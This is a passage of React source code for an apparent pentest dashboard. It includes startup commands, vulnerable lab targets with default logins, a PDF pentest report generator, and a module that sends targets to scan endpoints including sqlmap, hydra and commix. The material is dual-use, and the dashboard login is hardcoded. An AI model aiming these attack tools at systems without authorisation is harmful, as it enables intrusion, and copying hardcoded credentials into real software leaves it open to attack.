      background: tab===id ? "#22c55e22" : "transparent",
      color: tab===id ? G : DIM,
      borderBottom: tab===id ? `2px solid ${G}` : "2px solid transparent",
      transition:"all 0.2s", fontFamily:"monospace", letterSpacing:1
    }}>{icon} {label}</button>
  );

  const CopyBtn = ({text, id}) => (
    <button onClick={() => copy(text, id)} style={{
      background: copied===id ? "#22c55e33" : "#1e293b",
      border: `1px solid ${copied===id ? G : "#334155"}`,
      color: copied===id ? G : "#94a3b8",
      borderRadius:6, padding:"4px 12px", fontSize:11, cursor:"pointer",
      fontFamily:"monospace", fontWeight:700, transition:"all 0.2s", whiteSpace:"nowrap"
    }}>{copied===id ? "✓ COPIED" : "COPY"}</button>
  );

  const Block = ({id, label, code, comment}) => (
    <div style={{marginBottom:16}}>
      <div style={{display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:6}}>
        <span style={{color:G, fontWeight:700, fontSize:12, fontFamily:"monospace", letterSpacing:1}}>{label}</span>
        <CopyBtn text={code} id={id}/>
      </div>
      {comment && <div style={{color:"#475569", fontSize:11, fontFamily:"monospace", marginBottom:6}}># {comment}</div>}
      <pre style={{
        background:"#020617", border:"1px solid #1e293b", borderRadius:8, padding:"14px 16px",
        color:"#e2e8f0", fontSize:12, fontFamily:"'Courier New',monospace", margin:0,
        overflowX:"auto", lineHeight:1.7, whiteSpace:"pre-wrap", wordBreak:"break-word"
      }}>{code}</pre>
    </div>
  );

  const LabCard = ({name, url, type, desc, color}) => (
    <div style={{
      background:CARD, border:`1px solid ${BORDER}`, borderRadius:10, padding:"14px 16px",
      marginBottom:12, borderLeft:`3px solid ${color||G}`
    }}>
      <div style={{display:"flex", justifyContent:"space-between", alignItems:"flex-start", marginBottom:6}}>
        <div>
          <span style={{color:"#e2e8f0", fontWeight:700, fontSize:13}}>{name}</span>
          <span style={{
            marginLeft:10, background:`${color||G}22`, color:color||G,
            borderRadius:4, padding:"2px 8px", fontSize:10, fontWeight:700, fontFamily:"monospace"
          }}>{type}</span>
        </div>
        <CopyBtn text={url} id={name}/>
      </div>
      <div style={{color:"#94a3b8", fontSize:12, marginBottom:8}}>{desc}</div>
      <code style={{color:G, fontSize:12, fontFamily:"monospace", background:"#020617", padding:"4px 10px", borderRadius:5}}>{url}</code>
    </div>
  );

  const startupKali = `sudo service apache2 start
sudo service ssh start
sudo fuser -k 8000/tcp
cd ~/Cyber-project
uvicorn main:app --host 0.0.0.0 --port 8000 --reload`;

  const startupWindows = `cd "C:\\Users\\vijay\\OneDrive\\Desktop\\kali\\Cyber-project"
npm.cmd start`;

  const fixEndpoints = `# Check what's in main.py
grep "^@app.post" ~/main.py

# If ffuf/nuclei/wpscan/arjun missing:
cat ~/backend_additions.py >> ~/main.py

# If commix/lfi/ssrf/xxe/etc missing:
cat ~/backend_additions2.py >> ~/main.py

# Restart backend
sudo fuser -k 8000/tcp
uvicorn main:app --host 0.0.0.0 --port 8000 --reload`;

  const scpFiles = `# Run these on Windows in oscp-dashboard folder
scp backend_additions.py kali@192.168.56.102:~/
scp backend_additions2.py kali@192.168.56.102:~/`;

  const killPort = `sudo fuser -k 8000/tcp
uvicorn main:app --host 0.0.0.0 --port 8000 --reload`;

  const checkLogs = `# View recent scan errors
journalctl -u uvicorn -n 50
# Or check terminal where uvicorn is running`;

  const labs = [
    { name:"DVWA",                   url:"http://lab_dvwa",                    type:"🟢 LIVE", desc:"Damn Vulnerable Web App — login admin/password. SQLi, XSS, CSRF, File Upload, LFI.", color:"#22c55e" },
    { name:"WebGoat",               url:"http://lab_webgoat:8080/WebGoat",       type:"🟢 LIVE", desc:"OWASP WebGoat — guided lessons for all OWASP Top 10 vulnerabilities.", color:"#22c55e" },
    { name:"Juice Shop",            url:"http://lab_juiceshop:3000",               type:"🟢 LIVE", desc:"OWASP Juice Shop — 100+ challenges: JWT, SQLi, IDOR, XSS, SSRF. Login admin@juice-sh.op/admin123.", color:"#22c55e" },
    { name:"Mutillidae II",         url:"http://lab_mutillidae",                  type:"🟢 LIVE", desc:"OWASP Mutillidae — SQLi, XXE, CSRF, Clickjacking. Login admin/adminpass.", color:"#22c55e" },
    { name:"bWAPP",                 url:"http://lab_bwapp/bWAPP/login.php",       type:"🟢 LIVE", desc:"Buggy Web App — 100+ web vulnerabilities. Login bee/bug.", color:"#22c55e" },
    { name:"HackTheBox",             url:"https://www.hackthebox.com",                    type:"ONLINE",   desc:"Professional CTF platform. Real-world machines. Highly recommended for OSCP prep.", color:"#a855f7" },
    { name:"TryHackMe",              url:"https://tryhackme.com",                         type:"ONLINE",   desc:"Beginner-friendly guided rooms. Great learning path for web app pentesting.", color:"#3b82f6" },
    { name:"PentesterLab",           url:"https://pentesterlab.com",                      type:"ONLINE",   desc:"Web app security exercises. Excellent for SQLi, XSS, JWT attacks.", color:"#f59e0b" },
    { name:"PortSwigger Web Academy",url:"https://portswigger.net/web-security",          type:"ONLINE",   desc:"Free Burp Suite labs. Industry standard for web vulnerability learning.", color:"#ef4444" },
    { name:"VulnHub",                url:"https://www.vulnhub.com",                       type:"DOWNLOAD", desc:"Downloadable VMs. Import into VirtualBox/VMware. Great offline practice.", color:"#64748b" },
    { name:"OWASP Juice Shop",       url:"https://juice-shop.herokuapp.com",              type:"ONLINE",   desc:"Modern vulnerable app (Node.js). Covers OWASP Top 10 2021. Has scoreboard.", color:"#f97316" },
    { name:"Metasploitable 2",       url:"http://192.168.56.101",                         type:"LOCAL VM", desc:"Classic vulnerable Linux VM — many services exposed. Run alongside Kali.", color:"#22c55e" },
    { name:"OWASP WebGoat (Online)", url:"https://github.com/WebGoat/WebGoat/releases",   type:"DOWNLOAD", desc:"Download .jar and run locally: java -jar webgoat.jar", color:"#64748b" },
    { name:"HackTheBox Academy",     url:"https://academy.hackthebox.com",               type:"ONLINE",   desc:"Structured learning — Web Application Pentesting path directly maps to OSCP.", color:"#a855f7" },
  ];

  return (
    <div style={{padding:"28px 32px", maxWidth:960, margin:"0 auto"}}>
      <div style={{marginBottom:24}}>
        <div style={{color:G, fontWeight:800, fontSize:22, fontFamily:"monospace", letterSpacing:2, marginBottom:4}}>📖 RUN GUIDE & LAB TARGETS</div>
        <div style={{color:DIM, fontSize:13}}>Copy-paste commands to start everything · Vulnerable lab URLs for testing</div>
      </div>

      {/* Tabs */}
      <div style={{display:"flex", gap:4, borderBottom:`1px solid ${BORDER}`, marginBottom:24, flexWrap:"wrap"}}>
        {tabBtn("startup",   "Startup",        "🚀")}
        {tabBtn("fix",       "Fix Endpoints",  "🔧")}
        {tabBtn("labs",      "Lab Targets",    "🎯")}
        {tabBtn("howscan",   "How Scanning Works","🔬")}
        {tabBtn("checklist", "Daily Checklist", "✅")}
      </div>

      {tab === "startup" && (
        <div>
          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
            ⚡ Run STEP 1 (Kali) first, then STEP 2 (Windows). Always in this order.
          </div>
          <Block id="step1" label="STEP 1 — KALI TERMINAL" code={startupKali} comment="Paste all at once into Kali terminal. Leave it running." />
          <Block id="step2" label="STEP 2 — WINDOWS TERMINAL" code={startupWindows} comment="Open new terminal on Windows. Browser opens automatically at localhost:3000" />
          <Block id="kill"  label="FIX: PORT 8000 ALREADY IN USE" code={killPort} comment="Run on Kali if uvicorn says address already in use" />
          <Block id="scp"   label="TRANSFER FILES TO KALI (Windows)" code={scpFiles} comment="Run from oscp-dashboard folder on Windows when backend files are updated" />
          <Block id="logs"  label="CHECK BACKEND ERRORS" code={checkLogs} />
          <div style={{background:"#0a1628", border:"1px solid #1e293b", borderRadius:10, padding:"14px 16px", marginTop:8}}>
            <div style={{color:G, fontWeight:700, fontSize:12, fontFamily:"monospace", marginBottom:10}}>LOGIN CREDENTIALS</div>
            <div style={{display:"flex", gap:24}}>
              <div><span style={{color:DIM, fontSize:12}}>Username: </span><code style={{color:"#e2e8f0", fontSize:13}}>admin</code></div>
              <div><span style={{color:DIM, fontSize:12}}>Password: </span><code style={{color:"#e2e8f0", fontSize:13}}>admin123</code></div>
              <div><span style={{color:DIM, fontSize:12}}>API URL: </span><code style={{color:G, fontSize:13}}>{getApiUrl() || (window.location.origin + "/api")}</code></div>
            </div>
          </div>
        </div>
      )}

      {tab === "fix" && (
        <div>
          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
            🔧 If any scan phase shows ERROR — endpoint missing, use these commands on Kali.
          </div>
          <Block id="fix1" label="CHECK & FIX MISSING ENDPOINTS (KALI)" code={fixEndpoints} comment="Run on Kali. Checks what's in main.py then appends missing endpoints." />
          <div style={{background:CARD, border:`1px solid ${BORDER}`, borderRadius:10, padding:"16px 18px", marginTop:8}}>
            <div style={{color:G, fontWeight:700, fontSize:12, fontFamily:"monospace", marginBottom:12}}>ENDPOINT REFERENCE — ALL 25 PHASES</div>
            <div style={{display:"grid", gridTemplateColumns:"1fr 1fr", gap:6}}>
              {[
                ["wafw00f","backend_additions.py"],["whatweb","main.py"],["cms","main.py"],
                ["nmap","main.py"],["ssl","main.py"],["headers","main.py"],
                ["cookies","main.py"],["cors","main.py"],["gobuster","main.py"],
                ["subdomains","main.py"],["xss","main.py"],["nikto","main.py"],
                ["sqlmap","main.py"],["dns","main.py"],["ffuf","backend_additions.py"],
                ["commix","backend_additions2.py"],["lfi","backend_additions2.py"],["openredirect","backend_additions2.py"],
                ["sensitivefiles","backend_additions2.py"],["hydra","backend_additions2.py"],["ssrf","backend_additions2.py"],
                ["xxe","backend_additions2.py"],["clickjacking","backend_additions2.py"],["verbtamper","backend_additions2.py"],
                ["pollution","backend_additions2.py"],
              ].map(([ep, file]) => (
                <div key={ep} style={{display:"flex", justifyContent:"space-between", padding:"5px 10px", background:"#020617", borderRadius:6, fontSize:11, fontFamily:"monospace"}}>
                  <span style={{color:G}}>/{ep}</span>
                  <span style={{color:DIM}}>{file}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {tab === "labs" && (
        <div>
          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
            🎯 Click COPY next to any URL then paste into the scanner target field. Local targets need Kali VM running.
          </div>
          <div style={{display:"flex", gap:10, marginBottom:16, flexWrap:"wrap"}}>
            {[["LOCAL","#22c55e"],["ONLINE","#a855f7"],["DOWNLOAD","#64748b"],["LOCAL VM","#22c55e"]].map(([t,c])=>(
              <div key={t} style={{background:`${c}22`, color:c, borderRadius:6, padding:"3px 12px", fontSize:11, fontWeight:700, fontFamily:"monospace"}}>{t}</div>
            ))}
            <div style={{color:DIM, fontSize:11, alignSelf:"center", fontFamily:"monospace"}}>— color legend</div>
          </div>
          {labs.map((l,i) => <LabCard key={i} {...l}/>)}
        </div>
      )}

      {tab === "checklist" && (
        <div>
          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
            ✅ Run through this every session before scanning.
          </div>
          {[
            { step:"01", title:"Start VirtualBox", detail:"Open VirtualBox → Start Kali VM → Wait for desktop", ok:true },
            { step:"02", title:"Start Apache2 on Kali", detail:"sudo service apache2 start", code:true },
            { step:"03", title:"Start SSH on Kali",     detail:"sudo service ssh start", code:true },
            { step:"04", title:"Kill port 8000",         detail:"sudo fuser -k 8000/tcp", code:true },
            { step:"05", title:"Start backend",          detail:"cd ~/Cyber-project && uvicorn main:app --host 0.0.0.0 --port 8000 --reload", code:true },
            { step:"06", title:"Start frontend (Windows)", detail:'cd "C:\\Users\\vijay\\OneDrive\\Desktop\\kali\\Cyber-project" && npm.cmd start', code:true },
            { step:"07", title:"Verify backend alive",   detail:"Open http://YOUR-VPS-IP:8000/docs (or http://localhost:8000/docs) — should show FastAPI UI", ok:true },
            { step:"08", title:"Login",                   detail:"http://localhost:3000 → admin / admin123", ok:true },
            { step:"09", title:"Set target",              detail:"Paste target URL e.g. http://lab_dvwa/dvwa (DVWA Docker)", ok:true },
            { step:"10", title:"Run Full Scan (25 phases)", detail:"Click Web App Pentesting → Run Full Scan → Wait ~5 min", ok:true },
            { step:"11", title:"Generate PDF",            detail:"Click Generate PDF Report after scan completes", ok:true },
          ].map(({step, title, detail, code}) => (
            <div key={step} style={{
              background:CARD, border:`1px solid ${BORDER}`, borderRadius:10,
              padding:"14px 18px", marginBottom:10, display:"flex", gap:14, alignItems:"flex-start"
            }}>
              <div style={{
                width:32, height:32, borderRadius:8, background:"#22c55e22", border:`1px solid ${G}`,
                display:"flex", alignItems:"center", justifyContent:"center",
                color:G, fontWeight:800, fontSize:12, fontFamily:"monospace", flexShrink:0
              }}>{step}</div>
              <div style={{flex:1}}>
                <div style={{color:"#e2e8f0", fontWeight:700, fontSize:13, marginBottom:4}}>{title}</div>
                {code
                  ? <div style={{display:"flex", gap:10, alignItems:"center"}}>
                      <code style={{color:G, fontSize:11, fontFamily:"monospace", background:"#020617", padding:"4px 10px", borderRadius:5, flex:1}}>{detail}</code>
                      <CopyBtn text={detail} id={`c${step}`}/>
                    </div>
                  : <div style={{color:DIM, fontSize:12}}>{detail}</div>
                }
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function ComingSoon(props) {
  const topic = props.topic;
  if (!topic) return null;
  return (
    <div className="fade" style={{textAlign:"center",padding:"80px 20px"}}>
      <div style={{fontSize:48,marginBottom:12}}>{topic.icon}</div>
      <h2 style={{fontSize:20,fontWeight:700,color:"#f1f5f9",marginBottom:6}}>{topic.label}</h2>
      <p style={{fontSize:13,color:"#475569",marginBottom:30}}>Module under development</p>
    </div>
  );
}

// ── COMPREHENSIVE PDF REPORT FOR ALL MODULE SHELL MODULES ─────
function generateShellReport({title, icon, target, attacks, results}) {
  const doc = new jsPDF({orientation:"portrait",unit:"mm",format:"a4"});
  const W=210, M=15; let y=20;
  const SC = s=>s==="CRITICAL"?[239,68,68]:s==="HIGH"?[249,115,22]:s==="MEDIUM"?[234,179,8]:s==="LOW"?[34,197,94]:[100,116,139];
  const chk=(n=20)=>{if(y+n>280){doc.addPage();y=20;}};
  // jsPDF's default fonts (Helvetica/Courier) don't support Unicode emojis — they render
  // as garbled byte sequences like "Ø<ßð". Strip all emoji codepoints + variation selectors
  // before passing any text to doc.text(). Used everywhere icons appear (cover, sections, attacks).
  const _safe = s => String(s||"")
    .replace(/[\u{1F000}-\u{1FFFF}]/gu, "")   // Most emoji ranges
    .replace(/[\u{2600}-\u{27BF}]/gu, "")     // Misc symbols / dingbats
    .replace(/[\u{2B00}-\u{2BFF}]/gu, "")     // Arrows / boxes
    .replace(/[\u{FE00}-\u{FE0F}]/gu, "")     // Variation selectors
    .replace(/[\u{200D}]/gu, "")              // Zero-width joiner
    .replace(/\s+/g, " ")
    .trim();
  const sHead=(txt,accent)=>{
    chk(12); const [r,g,b]=accent||[30,64,175];
    doc.setFillColor(r,g,b); doc.rect(M,y,W-2*M,7,"F");
    doc.setFontSize(9); doc.setTextColor(255,255,255); doc.setFont("helvetica","bold");
    doc.text(txt.toUpperCase(),M+3,y+4.8); y+=11;
  };
  const row=(k,v,i)=>{
    chk(6); doc.setFillColor(i%2===0?13:18,i%2===0?20:26,i%2===0?42:52);
    doc.rect(M,y,W-2*M,6,"F");
    doc.setFontSize(8); doc.setTextColor(148,163,184); doc.setFont("helvetica","bold");
    doc.text(String(k),M+3,y+4);
    doc.setTextColor(241,245,249); doc.setFont("helvetica","normal");
    doc.text(String(v).slice(0,90),M+65,y+4); y+=6;
  };

  // ── Cover Page ────────────────────────────────────────────
  doc.setFillColor(5,8,20); doc.rect(0,0,W,297,"F");
  doc.setFillColor(30,64,175); doc.rect(0,0,W,4,"F");
  // VulnusLab shield logo + wordmark at top-center
  {
    const sx = W/2, sy = 24, sw = 14, sh = 16;
    doc.setFillColor(15,23,42);
    doc.setDrawColor(59,130,246); doc.setLineWidth(0.7);
    doc.lines([
      [sw*0.45,0],[sw*0.55,sh*0.15],[0,sh*0.5],
      [-sw*0.55,sh*0.5],[-sw*0.45,-sh*0.15],[-sw*0.45,-sh*0.4],
      [0,-sh*0.1],[sw*0.45,-sh*0.4],[0,sh*0.4]
    ], sx-sw*0.45, sy-sh*0.4, [1,1], 'FD');
    doc.setFont("helvetica","bold"); doc.setFontSize(12); doc.setTextColor(59,130,246);
    doc.text("V", sx, sy + 1, {align:"center"});
    doc.setFont("helvetica","bold"); doc.setFontSize(9);
    doc.setTextColor(241,245,249);
    doc.text("VULNUS", sx - 1, sy + 14, {align:"right"});
    doc.setTextColor(59,130,246);
    doc.text("LAB", sx, sy + 14, {align:"left"});
  }
  doc.setFontSize(26); doc.setTextColor(241,245,249); doc.setFont("helvetica","bold");
  doc.text("PENETRATION TEST", M, 75);
  doc.text("REPORT", M, 88);
  doc.setFontSize(16); doc.setTextColor(96,165,250);
  doc.text(_safe(`${icon}  ${title}`) || _safe(title), M, 105);
  doc.setFillColor(30,41,59); doc.rect(M,118,W-2*M,45,"F");
  doc.setFontSize(9); doc.setTextColor(148,163,184); doc.setFont("helvetica","normal");
  const coverInfo=[["Target",target||"—"],["Date",new Date().toLocaleDateString()],
    ["Time",new Date().toLocaleTimeString()],["Prepared By","VulnusLab Automated Pentest"],
    ["Classification","CONFIDENTIAL"],["Report Type","Security Assessment"]];
  coverInfo.forEach(([k,v],i)=>{
    doc.setTextColor(100,116,139); doc.setFont("helvetica","bold");
    doc.text(k+":",M+4,128+i*7);
    doc.setTextColor(241,245,249); doc.setFont("helvetica","normal");
    doc.text(String(v),M+40,128+i*7);
  });
  doc.setFontSize(7); doc.setTextColor(96,165,250); doc.setFont("helvetica","bold");
  doc.text("vulnuslab.com  ·  support@vulnuslab.com",W/2,275,{align:"center"});
  doc.setTextColor(51,65,85); doc.setFont("helvetica","normal");
  doc.text("Generated by VulnusLab — For authorized security testing only",W/2,282,{align:"center"});
  doc.addPage(); y=20;

  // ── Executive Summary ─────────────────────────────────────
  const allF=attacks.flatMap(a=>(results[a.id]?.findings||[]));
  const C={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
  allF.forEach(f=>{if(C[f.severity]!==undefined)C[f.severity]++;});
  const ran=attacks.filter(a=>results[a.id]);
  sHead("Executive Summary",[30,64,175]);
  [["Module",title],["Target",target||"—"],["Tests Run",`${ran.length} of ${attacks.length}`],
   ["Total Findings",allF.length],["Critical",`${C.CRITICAL} ${C.CRITICAL>0?"⚠ Immediate action required":""}`],
   ["High",C.HIGH],["Medium",C.MEDIUM],["Low",C.LOW],
   ["Risk Level",C.CRITICAL>0?"CRITICAL":C.HIGH>0?"HIGH":C.MEDIUM>0?"MEDIUM":"LOW"],
   ["Date",new Date().toLocaleDateString()]].forEach(([k,v],i)=>row(k,v,i));
  y+=6;

  // ── Risk Overview ─────────────────────────────────────────
  sHead("Risk Overview",[30,64,175]);
  chk(30);
  const bars=[["CRITICAL",C.CRITICAL,[239,68,68]],["HIGH",C.HIGH,[249,115,22]],
              ["MEDIUM",C.MEDIUM,[234,179,8]],["LOW",C.LOW,[34,197,94]]];
  const maxC=Math.max(...bars.map(b=>b[1]),1);
  bars.forEach(([lbl,cnt,clr])=>{
    chk(9); const bw=cnt>0?Math.max(4,(cnt/maxC)*(W-2*M-50)):3;
    doc.setFillColor(...clr); doc.rect(M,y,bw,6,"F");
    doc.setFontSize(8); doc.setTextColor(148,163,184); doc.setFont("helvetica","bold");
    doc.text(lbl,M+bw+3,y+4.5);
    doc.setTextColor(241,245,249); doc.setFont("helvetica","normal");
    doc.text(String(cnt),M+bw+35,y+4.5); y+=9;
  });
  y+=6;

  // ── Attack Coverage ───────────────────────────────────────
  sHead("Attack Coverage — What Was Tested",[30,64,175]);
  attacks.forEach((atk,i)=>{
    chk(10);
    const res=results[atk.id]; const ran2=!!res;
    const fcount=(res?.findings||[]).filter(f=>["CRITICAL","HIGH","MEDIUM"].includes(f.severity)).length;
    doc.setFillColor(i%2===0?13:18,i%2===0?20:26,i%2===0?42:52);
    doc.rect(M,y,W-2*M,8,"F");
    doc.setFontSize(8); doc.setTextColor(241,245,249); doc.setFont("helvetica","bold");
    doc.text(_safe(atk.label),M+3,y+5.5);
    doc.setFont("helvetica","normal"); doc.setTextColor(148,163,184);
    doc.text(_safe(atk.desc).slice(0,55),M+65,y+5.5);
    const status=!ran2?"NOT RUN":fcount>0?`${fcount} FINDING(S)`:"CLEAN";
    const [sr,sg,sb]=!ran2?[71,85,105]:fcount>0?[239,68,68]:[34,197,94];
    doc.setTextColor(sr,sg,sb); doc.setFont("helvetica","bold");
    doc.text(status,W-M-28,y+5.5); y+=9;
    // Vulnerabilities tested + target type
    if(atk.vulns && atk.vulns.length>0){
      chk(6); doc.setFontSize(7); doc.setTextColor(100,116,139); doc.setFont("helvetica","italic");
      doc.text("  Detects: "+atk.vulns.slice(0,3).join(", "),M+3,y+4); y+=5;
    }
    if(atk.target_type){
      chk(5); doc.setFontSize(7); doc.setTextColor(71,85,105); doc.setFont("helvetica","normal");
      doc.text("  Target: "+atk.target_type.slice(0,80),M+3,y+3); y+=5;
    }
  });
  y+=6;

  // ── How To Use Each Attack ────────────────────────────────
  sHead("Setup Instructions — How to Run Each Attack",[30,64,175]);
  attacks.forEach(atk=>{
    chk(20);
    doc.setFillColor(15,23,42); doc.rect(M,y,W-2*M,7,"F");
    doc.setFontSize(8); doc.setTextColor(96,165,250); doc.setFont("helvetica","bold");
    doc.text(_safe(atk.label),M+3,y+4.8); y+=9;
    if(atk.target_type){
      chk(5); doc.setFontSize(7); doc.setTextColor(251,191,36); doc.setFont("helvetica","bold");
      doc.text("Target: ",M+4,y);
      doc.setFont("helvetica","normal"); doc.setTextColor(203,213,225);
      doc.text(_safe(atk.target_type).slice(0,75),M+19,y); y+=5;
    }
    if(atk.howto){
      chk(7); doc.setFontSize(7.5); doc.setTextColor(203,213,225); doc.setFont("helvetica","normal");
      const lines=doc.splitTextToSize(_safe(atk.howto),W-2*M-6);
      lines.slice(0,3).forEach(l=>{chk(5);doc.text(l,M+4,y);y+=4.5;});
    }
    if(atk.requires){
      chk(6); doc.setFontSize(7); doc.setTextColor(234,179,8); doc.setFont("helvetica","bold");
      doc.text("Requires: ",M+4,y);
      doc.setFont("helvetica","normal"); doc.setTextColor(203,213,225);
      doc.text(_safe(atk.requires).slice(0,72),M+22,y); y+=5;
    }
    if(atk.vulns && atk.vulns.length>0){
      chk(5); doc.setFontSize(7); doc.setTextColor(34,197,94); doc.setFont("helvetica","bold");
      doc.text("Detects: ",M+4,y);
      doc.setFont("helvetica","normal"); doc.setTextColor(148,163,184);
      doc.text(_safe(atk.vulns.slice(0,3).join(" | ")).slice(0,80),M+20,y); y+=5;
    }
    y+=3;
  });

  // ── Hacker Impact Analysis ────────────────────────────────
  const hasImpact = attacks.some(a=>a.hackerImpact);
  if(hasImpact){
    sHead("How Hackers Exploit These Findings — Impact Analysis",[127,29,29]);
    attacks.forEach(atk=>{
      if(!atk.hackerImpact) return;
      chk(20);
      doc.setFillColor(40,10,10); doc.rect(M,y,W-2*M,7,"F");
      doc.setFontSize(8); doc.setTextColor(248,113,113); doc.setFont("helvetica","bold");
      doc.text(_safe(atk.label)+" — Real World Attack Scenario",M+3,y+4.8); y+=9;
      doc.setFontSize(7.5); doc.setTextColor(203,213,225); doc.setFont("helvetica","normal");
      const impLines=doc.splitTextToSize(_safe(atk.hackerImpact),W-2*M-6);
      impLines.slice(0,4).forEach(l=>{chk(5);doc.text(l,M+4,y);y+=4.5;});
      y+=4;
    });
  }

  // ── Detailed Findings ─────────────────────────────────────
  sHead("Detailed Findings",[30,64,175]);
  let foundAny=false;
  attacks.forEach(atk=>{
    const res=results[atk.id]; if(!res) return;
    const findings=(res.findings||[]).filter(f=>f.severity!=="INFO"||res.findings.length===1);
    if(!findings.length && !res.message) return;
    foundAny=true; chk(14);
    doc.setFillColor(20,30,55); doc.rect(M,y,W-2*M,8,"F");
    doc.setFontSize(9); doc.setTextColor(148,163,184); doc.setFont("helvetica","bold");
    doc.text(_safe(atk.label),M+3,y+5.5);
    if(res.message){
      const msgClean=res.message.replace(/[❌✅⚠]/g,"").trim();
      doc.setTextColor(...(res.message.includes("❌")?[239,68,68]:[34,197,94]));
      doc.setFontSize(7); doc.setFont("helvetica","italic");
      doc.text(msgClean.slice(0,60),W-M-62,y+5.5);
    }
    y+=10;
    if(!findings.length){
      chk(6); doc.setFontSize(7); doc.setTextColor(71,85,105); doc.setFont("helvetica","normal");
      doc.text("No actionable findings — target clean or tool not applicable",M+4,y); y+=8;
    } else {
      findings.slice(0,20).forEach(f=>{
        chk(8); const [fr,fg,fb]=SC(f.severity);
        doc.setFillColor(fr,fg,fb); doc.rect(M,y,20,5.5,"F");
        doc.setFontSize(7); doc.setTextColor(255,255,255); doc.setFont("helvetica","bold");
        doc.text((f.severity||"INFO").slice(0,8),M+1,y+4);
        doc.setTextColor(241,245,249); doc.setFont("helvetica","bold");
        doc.text(_safe(f.title).slice(0,40),M+22,y+4);
        if(f.detail){
          doc.setFont("helvetica","normal"); doc.setTextColor(148,163,184);
          doc.text(_safe(f.detail).slice(0,60),M+22,y+9); y+=5;
        }
        y+=7;
      });
    }
    if(res.commands && Object.keys(res.commands).length>0){
      chk(8); doc.setFontSize(7); doc.setTextColor(74,222,128); doc.setFont("courier","bold");
      doc.text("Generated Commands:",M+4,y); y+=5;
      Object.entries(res.commands).slice(0,4).forEach(([k,v])=>{
        chk(6); doc.setTextColor(100,116,139); doc.text(`${k}: `,M+6,y);
        doc.setTextColor(74,222,128); doc.text(String(v).slice(0,80),M+30,y); y+=5;
      });
    }
    y+=4;
  });
  if(!foundAny){
    chk(10); doc.setFontSize(9); doc.setTextColor(71,85,105); doc.setFont("helvetica","italic");
    doc.text("No tests run yet. Enter a target and click Run on each attack.",M+4,y); y+=12;
  }

  // ── Remediation ───────────────────────────────────────────
  const critFinds=allF.filter(f=>["CRITICAL","HIGH"].includes(f.severity));
  if(critFinds.length>0){
    sHead("Remediation Recommendations",[127,29,29]);
    critFinds.slice(0,10).forEach((f,i)=>{
      chk(14); row(f.title||`Finding ${i+1}`,f.severity,i);
      if(f.detail){
        chk(6); doc.setFontSize(7); doc.setTextColor(100,116,139);
        doc.text("Detail: "+String(f.detail).slice(0,90),M+4,y); y+=5;
      }
      const remap={"SUID":"Remove SUID bit or restrict execution","Hash":"Force password reset, enable MFA",
        "Shell":"Patch vulnerability, review firewall rules","Crack":"Use longer passwords (12+ chars), MFA",
        "Key":"Rotate credentials immediately","Permission":"Restrict file permissions to minimum required"};
      const rem=Object.entries(remap).find(([k])=>f.title&&f.title.includes(k));
      if(rem){chk(5);doc.setTextColor(34,197,94);doc.text("Fix: "+rem[1],M+4,y);y+=5;}
      y+=3;
    });
  }

  // ── End of report block ───────────────────────────────────
  chk(34);
  doc.setFillColor(241,245,249); doc.rect(M, y+2, W-2*M, 28, "F");
  doc.setFillColor(59,130,246); doc.rect(M, y+2, 3, 28, "F");
  doc.setFontSize(10); doc.setTextColor(59,130,246); doc.setFont("helvetica","bold");
  doc.text("— END OF REPORT —", W/2, y+10, {align:"center"});
  doc.setFontSize(6.5); doc.setTextColor(100,116,139); doc.setFont("helvetica","normal");
  doc.text(`Generated by VulnusLab — automated ${_safe(title).toLowerCase()} testing by VulnusLab engine.`, W/2, y+16, {align:"center"});
  doc.text("All findings require manual verification. This document is CONFIDENTIAL — restricted to authorized personnel only.", W/2, y+20, {align:"center"});
  doc.setFontSize(7); doc.setTextColor(59,130,246); doc.setFont("helvetica","bold");
  doc.text("vulnuslab.com  ·  support@vulnuslab.com", W/2, y+27, {align:"center"});

  // ── Footer on all pages ───────────────────────────────────
  const pages=doc.getNumberOfPages();
  for(let i=1;i<=pages;i++){
    doc.setPage(i);
    doc.setFillColor(10,15,30); doc.rect(0,288,W,9,"F");
    doc.setFontSize(6); doc.setTextColor(71,85,105); doc.setFont("helvetica","normal");
    doc.text(`VulnusLab | CONFIDENTIAL · vulnuslab.com — ${_safe(title)} — Target: ${_safe(target)||"—"}`,M,293);
    doc.text(`Page ${i}/${pages}`,W-M-12,293);
  }
  doc.save(`shell_${_pdfFn(target)}_${_pdfDt()}.pdf`);
}

// ── SHARED MODULE SHELL ──────────────────────────────────────
function ModuleShell({title, icon, color, desc, token, apiUrl, attacks, extraInputs, bodyFn}) {
  const API = apiUrl || getApiUrl();
  const tok = token || getAuthToken();
  const [target, setTarget] = useState("");
  const [opts,   setOpts]   = useState({});
  const [loading,setLoading]= useState("");
  const [results,setResults]= useState({});
  const [guide,  setGuide]  = useState(false);
  const sevColor = s => s==="CRITICAL"?"#ef4444":s==="HIGH"?"#f97316":s==="MEDIUM"?"#eab308":s==="LOW"?"#22c55e":"#64748b";
  const hasResults = attacks.some(a => results[a.id]);

  const run = async (atk) => {
    setLoading(atk.id);
    try {
      const body = bodyFn ? bodyFn(target, opts, atk) : {target, options: opts};
      const r = await fetch(`${API}${atk.ep}`, {
        method:"POST",
        headers:{"Content-Type":"application/json","Authorization":`Bearer ${tok}`},
        body: JSON.stringify(body)
      });
      if (!r.ok) {
        let detail = `HTTP ${r.status}`;
        try { const j = await r.json(); detail = j.detail || j.error || detail; } catch {}
        setResults(p=>({...p,[atk.id]:{error: detail, status: r.status}}));
      } else {
        const data = await r.json();
        setResults(p=>({...p,[atk.id]:data}));
      }
    } catch(e) {
      setResults(p=>({...p,[atk.id]:{error:e.message}}));
    }
    setLoading("");
  };

  return (
    <div style={{padding:"0 0 40px"}}>
      {/* Header */}
